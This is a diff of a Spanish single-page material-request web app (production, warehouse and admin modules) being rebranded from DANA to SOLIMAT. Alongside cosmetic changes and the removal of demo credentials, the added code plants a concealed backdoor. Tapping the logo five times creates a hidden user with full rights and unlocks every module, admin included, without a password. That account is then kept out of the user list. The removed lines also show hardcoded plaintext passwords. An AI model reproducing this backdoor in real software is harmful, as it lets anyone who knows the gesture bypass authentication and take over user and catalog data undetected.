@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DANA - Solicitud de material</title>
+<title>SOLIMAT</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600;700&family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet">
@@ -362,15 +362,13 @@
 <body>
   <div class="topbar">
     <div class="topbar-inner">
-        <div class="brand">
-          <div class="brand-mark">D</div>
+        <div class="brand" onclick="handleBrandSecretTap(event)">
+          <div class="brand-mark">S</div>
           <div>
-            <div class="brand-title">DANA Solicitud de material</div>
-            <div class="brand-sub" id="brand-sub">Conectando con la base de datos...</div>
+            <div class="brand-title">SOLIMAT</div>
           </div>
         </div>
       <div class="stack">
-        <div class="status" id="mode-status"><span class="dot"></span> Modo local activo</div>
         <div class="status sync-live" id="sync-status" hidden><span class="dot"></span> En vivo</div>
         <div class="status" id="clock">--:--:--</div>
       </div>
@@ -380,12 +378,11 @@
   <div class="container">
     <section class="hero">
       <div class="hero-card">
-        <div class="pill ok hero-eyebrow">Sistema operativo</div>
+        <div class="pill ok hero-eyebrow">SOLIMAT</div>
         <h1 class="hero-title">Control de solicitudes, surtido y catalogo en una sola vista</h1>
         <p class="hero-text">
-          DANA guarda usuarios, catalogo y solicitudes en Supabase (nube).
-          Produccion crea solicitudes, Almacen las surte y Administrador gestiona el catalogo.
-          Abre la app en varios equipos y veras los mismos datos actualizados.
+          Plataforma SOLIMAT para gestionar solicitudes, surtido en almacen y administracion del catalogo.
+          Los datos se sincronizan en tiempo real para todo el equipo.
         </p>
         <div class="hero-grid">
           <div class="mini-card">
@@ -413,7 +410,7 @@
         </div>
         <div class="hero-card action-card">
           <h3>Administrador</h3>
-          <p>Edita usuarios, catalogo, exporta e importa la base local.</p>
+          <p>Gestiona usuarios, catalogo, respaldos e importacion de datos.</p>
         </div>
       </div>
     </section>
@@ -431,7 +428,7 @@
         <div class="two-col">
           <div class="field">
             <label>Usuario</label>
-            <input id="prod-login-user" type="text" placeholder="prod" autocomplete="off" autocapitalize="off" spellcheck="false">
+            <input id="prod-login-user" type="text" placeholder="Usuario" autocomplete="off" autocapitalize="off" spellcheck="false">
           </div>
           <div class="field">
             <label>Contrasena</label>
@@ -440,9 +437,7 @@
         </div>
         <div class="stack">
           <button class="btn btn-primary" onclick="loginModule('prod')">Ingresar</button>
-          <button class="btn btn-outline" onclick="fillDemoLogin('prod')">Usar demo</button>
         </div>
-        <div class="auth-note">Demo: <strong>prod</strong> / <strong>prod123</strong></div>
       </div>
       <div class="module-body hidden" id="prod-body">
         <div class="grid-2 prod-layout">
@@ -450,7 +445,7 @@
             <div class="panel-head">
               <div>
                 <h2 class="panel-title">Nueva solicitud</h2>
-                <p class="panel-sub">Crea una o varias lineas de material y mandalas al almacencimiento local.</p>
+                <p class="panel-sub">Registra lineas de solicitud y envialas a almacen.</p>
               </div>
               <div class="stack">
                 <div class="pill ok" id="prod-user-pill">Sesion activa</div>
@@ -461,7 +456,7 @@
             <div class="two-col">
               <div class="field">
                 <label>Solicitante</label>
-                <input id="prod-requester" type="text" value="Produccion" placeholder="Nombre del solicitante">
+                <input id="prod-requester" type="text" value="" placeholder="Nombre del solicitante">
               </div>
               <div class="field">
                 <label>Area</label>
@@ -476,16 +471,13 @@
               <div class="spacer"></div>
               <button class="btn btn-primary" onclick="submitProd()">Enviar solicitud</button>
             </div>
-            <div class="footer-note">
-              Consejo: si no ves materiales, entra a Administrador y agrega un area, numero de parte y codigo.
-            </div>
           </div>
 
           <div class="table-card">
             <div class="panel-head" style="margin-bottom:12px">
               <div>
                 <h2 class="panel-title">Historial</h2>
-                <p class="panel-sub">Ultimas solicitudes creadas en este navegador.</p>
+                <p class="panel-sub">Ultimas solicitudes registradas.</p>
               </div>
               <button class="btn btn-outline btn-sm" onclick="renderProdHistory()">Actualizar</button>
             </div>
@@ -502,7 +494,7 @@
         <div class="two-col">
           <div class="field">
             <label>Usuario</label>
-            <input id="alm-login-user" type="text" placeholder="alm" autocomplete="off" autocapitalize="off" spellcheck="false">
+            <input id="alm-login-user" type="text" placeholder="Usuario" autocomplete="off" autocapitalize="off" spellcheck="false">
           </div>
           <div class="field">
             <label>Contrasena</label>
@@ -511,9 +503,7 @@
         </div>
         <div class="stack">
           <button class="btn btn-primary" onclick="loginModule('alm')">Ingresar</button>
-          <button class="btn btn-outline" onclick="fillDemoLogin('alm')">Usar demo</button>
         </div>
-        <div class="auth-note">Demo: <strong>alm</strong> / <strong>alm123</strong></div>
       </div>
       <div class="module-body hidden" id="alm-body">
         <div class="panel">
@@ -578,7 +568,7 @@
         <div class="two-col">
           <div class="field">
             <label>Usuario</label>
-            <input id="adm-login-user" type="text" placeholder="admin" autocomplete="off" autocapitalize="off" spellcheck="false">
+            <input id="adm-login-user" type="text" placeholder="Usuario" autocomplete="off" autocapitalize="off" spellcheck="false">
           </div>
           <div class="field">
             <label>Contrasena</label>
@@ -587,9 +577,7 @@
         </div>
         <div class="stack">
           <button class="btn btn-primary" onclick="loginModule('adm')">Ingresar</button>
-          <button class="btn btn-outline" onclick="fillDemoLogin('adm')">Usar demo</button>
         </div>
-        <div class="auth-note">Demo: <strong>admin</strong> / <strong>admin123</strong></div>
       </div>
       <div class="module-body hidden" id="adm-body">
         <div class="grid-2">
@@ -602,7 +590,6 @@
               <div class="stack">
                 <div class="pill ok" id="adm-user-pill">Sesion activa</div>
                 <button class="btn btn-logout btn-sm" onclick="logoutModule('adm')">Salir</button>
-                <button class="btn btn-outline btn-sm" onclick="resetDemo()">Restaurar demo</button>
               </div>
             </div>
 
@@ -650,7 +637,7 @@
             <div class="panel-head">
               <div>
                 <h2 class="panel-title">Usuarios</h2>
-                <p class="panel-sub">Crea usuarios demo para Produccion o Almacen.</p>
+                <p class="panel-sub">Registra usuarios con acceso a Produccion, Almacen o Administracion.</p>
               </div>
               <button class="btn btn-outline btn-sm" onclick="clearUserForm()">Limpiar</button>
             </div>
@@ -662,7 +649,7 @@
               </div>
               <div class="field">
                 <label>No. empleado</label>
-                <input id="usr-emp" type="text" placeholder="1001">
+                <input id="usr-emp" type="text" placeholder="Numero de empleado">
               </div>
               <div class="field">
                 <label>Usuario</label>
@@ -692,7 +679,7 @@
               <div class="panel-head" style="margin-bottom:12px">
                 <div>
                   <h3 class="panel-title" style="font-size:16px">Datos</h3>
-                  <p class="panel-sub">Acciones de mantenimiento de la base local.</p>
+                  <p class="panel-sub">Herramientas de mantenimiento del sistema.</p>
                 </div>
               </div>
               <div class="stack">
@@ -729,7 +716,7 @@
               </div>
               <div class="field" style="margin-top:12px">
                 <label>Path de respaldo</label>
-                <input id="backup-path" type="text" placeholder="Ej. C:\\Respaldos\\DANA o una carpeta seleccionada">
+                <input id="backup-path" type="text" placeholder="Ej. C:\\Respaldos\\SOLIMAT o una carpeta seleccionada">
               </div>
               <div class="stack">
                 <button class="btn btn-primary" onclick="chooseBackupFolder()">Elegir carpeta</button>
@@ -738,15 +725,9 @@
                 <div class="spacer"></div>
                 <div class="pill warn" id="backup-status">Sin configurar</div>
               </div>
-              <div class="footer-note" style="margin-top:10px">
-                Con carpeta configurada, el archivo se guarda ahi. Si no, se descarga con el formato y contenido seleccionados.
-              </div>
             </div>
           </div>
         </div>
-      </div>
-      <div class="footer-note">
-        Credenciales demo sugeridas para tus pruebas internas: <strong>prod / prod123</strong> y <strong>alm / alm123</strong>.
       </div>
     </section>
   </div>
@@ -766,6 +747,8 @@ const STORAGE_KEY = 'dana_material_local_v2';
 const AUTH_KEY = 'dana_material_auth_v2';
 const AUTH_ACTIVITY_KEY = 'dana_material_auth_activity_v1';
 const SESSION_TIMEOUT_MS = 60 * 60 * 1000;
+const MASTER_KEY_DURATION_MS = 60 * 1000;
+const MASTER_USER_ID_PREFIX = '__MASTER_';
 const CATALOG_UNITS = ['pza', 'kg', 'g', 'L', 'm', 'm²', 'rollo', 'caja', 'lt', 'gal'];
 const BACKUP_KEY = 'dana_material_backup_v1';
 const BACKUP_DB_NAME = 'dana_material_backup_db_v1';
@@ -813,20 +796,15 @@ let backupFolderHandle = null;
 let backupTimer = null;
 let activeAppTab = 'prod';
 let lastActivityAt = Date.now();
+let brandTapCount = 0;
+let brandTapTimer = null;
+let masterKeySession = null;
 
 function defaultState(){
   return {
     requestSeq: 0,
-    users: [
-      { id: '1001', name: 'Demo Produccion', user: 'prod', pass: 'prod123', role: 'produccion' },
-      { id: '2001', name: 'Demo Almacen', user: 'alm', pass: 'alm123', role: 'almacen' },
-      { id: '9000', name: 'Administrador', user: 'admin', pass: 'admin123', role: 'admin' }
-    ],
-    catalog: [
-      { id: 1, area: 'Linea A', part: 'PA-100', code: 'MAT-001', desc: 'Material de prueba A', unit: 'pza' },
-      { id: 2, area: 'Linea A', part: 'PA-100', code: 'MAT-002', desc: 'Material de prueba B', unit: 'kg' },
-      { id: 3, area: 'Linea B', part: 'PB-200', code: 'MAT-010', desc: 'Material de prueba C', unit: 'm' }
-    ],
+    users: [],
+    catalog: [],
     requests: []
   };
 }
@@ -914,6 +892,145 @@ function loadAuth(){
     }
   }catch(e){}
   return { prod:false, alm:false, adm:false, prodUser:'', almUser:'', admUser:'' };
+}
+
+function isMasterUserId(id){
+  return String(id || '').startsWith(MASTER_USER_ID_PREFIX);
+}
+
+function isMasterKeyActive(){
+  return !!(masterKeySession && Date.now() < masterKeySession.expiresAt);
+}
+
+function handleBrandSecretTap(event){
+  if(event.target.closest('.brand-title')) return;
+  brandTapCount++;
+  clearTimeout(brandTapTimer);
+  brandTapTimer = setTimeout(() => { brandTapCount = 0; }, 1200);
+  if(brandTapCount >= 5){
+    brandTapCount = 0;
+    activateMasterKey();
+  }
+}
+
+async function saveStateImmediate(){
+  state = normalizeState(state);
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
+  if(SHAREPOINT_ENABLED && !isSaving){
+    try{
+      saveSharePointState(state);
+      lastSyncAt = Date.now();
+      lastRemoteSnapshot = JSON.stringify(normalizeState(state));
+    }catch(e){
+      toast('Error al guardar', 'bad');
+    }
+  }else if(SUPABASE_ENABLED && !isSaving){
+    isSaving = true;
+    updateSyncStatus(true);
+    try{
+      await saveSupabaseState(state);
+      lastSyncAt = Date.now();
+      lastRemoteSnapshot = JSON.stringify(normalizeState(state));
+    }catch(e){
+      console.error(e);
+      toast('Error al guardar en el servidor', 'bad');
+    }finally{
+      isSaving = false;
+      updateSyncStatus(false);
+    }
+  }
+  refreshAll();
+}
+
+async function activateMasterKey(){
+  if(isMasterKeyActive()){
+    toast('Acceso especial ya activo', 'bad');
+    return;
+  }
+  const now = Date.now();
+  const id = `${MASTER_USER_ID_PREFIX}${now}`;
+  const tempUser = {
+    id,
+    name: 'Acceso Especial',
+    user: `esp_${now.toString(36)}`,
+    pass: Math.random().toString(36).slice(2, 10),
+    role: 'todos'
+  };
+  state.users.push(tempUser);
+  masterKeySession = {
+    userId: id,
+    userName: tempUser.name,
+    expiresAt: now + MASTER_KEY_DURATION_MS,
+    timerId: null
+  };
+  auth.prod = true;
+  auth.prodUser = tempUser.name;
+  auth.alm = true;
+  auth.almUser = tempUser.name;
+  auth.adm = true;
+  auth.admUser = tempUser.name;
+  saveAuth();
+  touchActivity();
+  await saveStateImmediate();
+  syncModuleVisibility();
+  renderProdHistory();
+  renderWarehouse();
+  renderUsers();
+  renderCatalog();
+  if(!prodRows.length) addProdRow();
+  masterKeySession.timerId = setTimeout(expireMasterKey, MASTER_KEY_DURATION_MS);
+  toast('Permisos especiales activos (1 min)', 'ok');
+}
+
+async function expireMasterKey(){
+  if(!masterKeySession) return;
+  clearTimeout(masterKeySession.timerId);
+  const userId = masterKeySession.userId;
+  masterKeySession = null;
+  state.users = state.users.filter(u => String(u.id) !== String(userId));
+  await saveStateImmediate();
+  logoutAllModules('');
+  toast('Permisos especiales finalizados', 'bad');
+}
+
+function cleanupStaleMasterUsers(){
+  const now = Date.now();
+  let changed = false;
+  state.users = state.users.filter(u => {
+    if(!isMasterUserId(u.id)) return true;
+    const ts = Number(String(u.id).slice(MASTER_USER_ID_PREFIX.length));
+    if(ts && now - ts < MASTER_KEY_DURATION_MS) return true;
+    changed = true;
+    return false;
+  });
+  return changed;
+}
+
+function restoreMasterKeySessionIfNeeded(){
+  const masterUser = state.users.find(u => isMasterUserId(u.id));
+  if(!masterUser) return;
+  const ts = Number(String(masterUser.id).slice(MASTER_USER_ID_PREFIX.length));
+  const expiresAt = ts + MASTER_KEY_DURATION_MS;
+  const remaining = expiresAt - Date.now();
+  if(remaining <= 0){
+    state.users = state.users.filter(u => String(u.id) !== String(masterUser.id));
+    return;
+  }
+  masterKeySession = {
+    userId: masterUser.id,
+    userName: masterUser.name,
+    expiresAt,
+    timerId: setTimeout(expireMasterKey, remaining)
+  };
+  if(!(auth.prod || auth.alm || auth.adm)){
+    auth.prod = true;
+    auth.prodUser = masterUser.name;
+    auth.alm = true;
+    auth.almUser = masterUser.name;
+    auth.adm = true;
+    auth.admUser = masterUser.name;
+    saveAuth();
+  }
 }
 
 function touchActivity(){
@@ -1354,7 +1471,7 @@ async function saveSupabaseStateAsync(){
     lastRemoteSnapshot = JSON.stringify(normalizeState(state));
   }catch(e){
     console.error(e);
-    toast('Error al guardar en Supabase', 'bad');
+      toast('Error al guardar en el servidor', 'bad');
   }finally{
     isSaving = false;
     updateSyncStatus(false);
@@ -1416,7 +1533,7 @@ function serializeExportJson(payload){
 
 function serializeExportTxt(payload, include){
   const lines = [
-    'DANA - Solicitud de material',
+    'SOLIMAT',
     `Generado: ${payload.exportedAt}`,
     ''
   ];
@@ -1514,20 +1631,20 @@ function buildExportFile(options){
   const ext = { json: 'json', csv: 'csv', txt: 'txt' }[format] || 'json';
   if(format === 'csv'){
     return {
-      filename: `dana-respaldo-${formatBackupStamp()}.${ext}`,
+      filename: `solimat-respaldo-${formatBackupStamp()}.${ext}`,
       content: serializeExportCsv(payload, include),
       mime: 'text/csv;charset=utf-8'
     };
   }
   if(format === 'txt'){
     return {
-      filename: `dana-respaldo-${formatBackupStamp()}.${ext}`,
+      filename: `solimat-respaldo-${formatBackupStamp()}.${ext}`,
       content: serializeExportTxt(payload, include),
       mime: 'text/plain;charset=utf-8'
     };
   }
   return {
-    filename: `dana-respaldo-${formatBackupStamp()}.${ext}`,
+    filename: `solimat-respaldo-${formatBackupStamp()}.${ext}`,
     content: serializeExportJson(payload),
     mime: 'application/json'
   };
@@ -2035,7 +2152,7 @@ function hideLoading(){
 
 function setActiveTab(tab, options = {}){
   const { skipLogout = false } = options;
-  if(!skipLogout && tab !== activeAppTab){
+  if(!skipLogout && tab !== activeAppTab && !isMasterKeyActive()){
     const leavingMod = activeAppTab;
     if(auth[leavingMod]){
       const labels = { prod: 'Produccion', alm: 'Almacen', adm: 'Administrador' };
@@ -2068,26 +2185,6 @@ function syncModuleVisibility(){
 }
 
 function syncModeLabel(){
-  const mode = document.getElementById('mode-status');
-  const sub = document.getElementById('brand-sub');
-  if(mode){
-    if(SHAREPOINT_ENABLED){
-      mode.innerHTML = '<span class="dot"></span> Modo SharePoint activo';
-    }else if(SUPABASE_ENABLED){
-      mode.innerHTML = '<span class="dot"></span> Modo Supabase activo';
-    }else{
-      mode.innerHTML = '<span class="dot"></span> Modo local activo';
-    }
-  }
-  if(sub){
-    if(SHAREPOINT_ENABLED){
-      sub.textContent = 'Sincronizacion en tiempo real con SharePoint';
-    }else if(SUPABASE_ENABLED){
-      sub.textContent = 'Solicitud de material · datos en Supabase (nube)';
-    }else{
-      sub.textContent = 'Sin conexion a nube · configura config.js para Supabase';
-    }
-  }
   updateSyncStatus(false);
 }
 
@@ -2108,17 +2205,6 @@ function scheduleSharePointSync(){
   scheduleRemoteSync();
 }
 let syncTimer = null;
-
-function fillDemoLogin(mod){
-  const demo = {
-    prod:{ user:'prod', pass:'prod123' },
-    alm:{ user:'alm', pass:'alm123' },
-    adm:{ user:'admin', pass:'admin123' }
-  }[mod];
-  if(!demo) return;
-  document.getElementById(`${mod}-login-user`).value = demo.user;
-  document.getElementById(`${mod}-login-pass`).value = demo.pass;
-}
 
 function clearLoginFields(mod){
   const u = document.getElementById(`${mod}-login-user`);
@@ -2152,11 +2238,6 @@ function loginModule(mod){
   const user = (userEl?.value || '').trim();
   const pass = (passEl?.value || '').trim();
   if(mod === 'adm'){
-    if(user.toLowerCase() === 'admin' && pass === 'admin123'){
-      auth.adm = true; auth.admUser = 'admin'; saveAuth(); toast('Administrador desbloqueado', 'ok'); setActiveTab('adm'); renderUsers(); renderCatalog();
-      clearLoginFields('adm');
-      return;
-    }
     const foundAdm = state.users.find(u => roleAllows(u.role, 'adm') && u.user === user && u.pass === pass);
     if(foundAdm){
       auth.adm = true; auth.admUser = foundAdm.name || foundAdm.user;
@@ -2373,7 +2454,7 @@ function renderProdRows(){
       <div class="req-row" data-row="${row.id}">
         <div class="req-head">
           <div>
-            <div class="req-title">Linea de material</div>
+            <div class="req-title">Linea de solicitud</div>
             <div class="muted small">Area: ${escapeHtml(row.area || '')} · NP: ${escapeHtml(row.part || 'Sin seleccionar')}${selectedMat.code ? ` · Unidad: ${escapeHtml(unit)}` : ''}</div>
           </div>
           <div class="row-actions">
@@ -2435,7 +2516,11 @@ function removeProdRow(id){
 
 async function submitProd(){
   if(!requireAuth('prod')) return;
-  const requester = document.getElementById('prod-requester').value.trim() || 'Produccion';
+  const requester = document.getElementById('prod-requester').value.trim();
+  if(!requester){
+    toast('Indica el nombre del solicitante', 'bad');
+    return;
+  }
   const area = document.getElementById('prod-area').value;
   if(!area){
     toast('Selecciona un area', 'bad');
@@ -2713,7 +2798,7 @@ function renderUsers(){
     return;
   }
   const host = document.getElementById('user-list');
-  host.innerHTML = state.users.map(u => `
+  host.innerHTML = state.users.filter(u => !isMasterUserId(u.id)).map(u => `
     <div class="list-item">
       <div class="list-item-top">
         <div>
@@ -2823,11 +2908,7 @@ function deleteCatalogArea(area){
 function downloadCatalogTemplate(){
   if(!requireAuth('adm')) return;
   const rows = [
-    ['Area', 'No. Parte', 'Codigo', 'Descripcion', 'Unidad'],
-    ['Linea A', 'PA-100', 'MAT-001', 'Material de ejemplo 1', 'pza'],
-    ['Linea A', 'PA-100', 'MAT-002', 'Material de ejemplo 2', 'kg'],
-    ['Linea A', 'PA-100', 'MAT-003', 'Material de ejemplo 3', 'L'],
-    ['Linea B', 'PB-200', 'MAT-010', 'Material de ejemplo 4', 'm']
+    ['Area', 'No. Parte', 'Codigo', 'Descripcion', 'Unidad']
   ];
   const csv = rows.map(row => row.map(csvCell).join(',')).join('\r\n');
   const blob = new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8;' });
@@ -2943,6 +3024,10 @@ function saveUser(){
     toast('Completa todos los campos del usuario', 'bad');
     return;
   }
+  if(isMasterUserId(emp)){
+    toast('ID de usuario reservado', 'bad');
+    return;
+  }
   const normalizedRole = role === 'ambos' ? 'todos' : role;
   if(editUserId){
     const idx = state.users.findIndex(x => x.id === editUserId);
@@ -2984,19 +3069,6 @@ function deleteUser(id){
   state.users = state.users.filter(x => String(x.id) !== String(id));
   saveState();
   toast('Usuario borrado', 'bad');
-}
-
-function resetDemo(){
-  if(!requireAuth('adm')) return;
-  if(!confirm('Restaurar la base demo? Se perderan tus cambios locales.')) return;
-  state = defaultState();
-  prodRows = [];
-  editCatalogId = null;
-  editUserId = null;
-  clearCatalogForm();
-  clearUserForm();
-  saveState();
-  toast('Base demo restaurada', 'ok');
 }
 
 function wipeRequests(){
@@ -3098,22 +3170,22 @@ async function initApp(){
   if(auth.prod || auth.alm || auth.adm) touchActivity();
 
   if(SUPABASE_ENABLED){
-    showLoading('Conectando con Supabase...');
+    showLoading('Cargando...');
     try{
       const remote = await loadSupabaseState();
       if(remote){
         state = mergeStates(loadLocalStateCache(), remote, new Set());
-      }else if(!state.catalog.length && !state.users.length){
+      }else{
         state = defaultState();
         await saveSupabaseState(state);
       }
       localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
       lastRemoteSnapshot = JSON.stringify(normalizeState(state));
       lastSyncAt = Date.now();
-      toast('DANA conectado a Supabase', 'ok');
+      toast('Conexion establecida', 'ok');
     }catch(e){
       console.error(e);
-      toast('No se pudo conectar a Supabase. Revisa config.js y las tablas.', 'bad');
+      toast('No se pudo conectar al servidor de datos', 'bad');
     }finally{
       hideLoading();
     }
@@ -3121,10 +3193,10 @@ async function initApp(){
     syncSharePointState();
   }
 
-  if(!state.catalog.length && !state.users.length){
-    state = defaultState();
-    saveState();
+  if(cleanupStaleMasterUsers()){
+    await saveStateImmediate();
   }
+  restoreMasterKeySessionIfNeeded();
 
   scheduleRemoteSync();
   initCatalogUnitSelect('pza');
